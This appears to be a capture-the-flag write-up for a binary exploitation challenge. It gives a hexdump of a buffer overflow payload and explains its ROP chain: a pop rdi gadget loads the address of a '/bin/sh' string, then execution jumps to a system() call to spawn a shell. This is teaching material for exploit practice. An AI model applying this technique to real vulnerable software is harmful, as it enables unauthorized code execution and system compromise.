# solution
Payload we need to send to the tool is:

00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
*
00000020  42 42 42 42 42 42 42 42  cb 05 40 00 00 00 00 00  |BBBBBBBB..@.....|
00000030  91 10 60 00 00 00 00 00  d8 05 40 00 00 00 00 00  |..`.......@.....|
00000040  0a                                                |.|
00000041


The 0x41 overflow the buffer and after 0x28 * "A" we have control of RIP.
We create a mini ROP chain consisting of a pop rdi at 0x4005cb, followed by the value we want to pop to
rdi. We see that there is a lost string in the .data section at 0x601060 which mentions /bin/sh. We pop exactly
that suffix into rdi using address 0x601091. Then we just jump the convenient call to system() at 0x4005d8 which
wants it's first argument (/bin/sh) in rdi. Profit.

see solution.py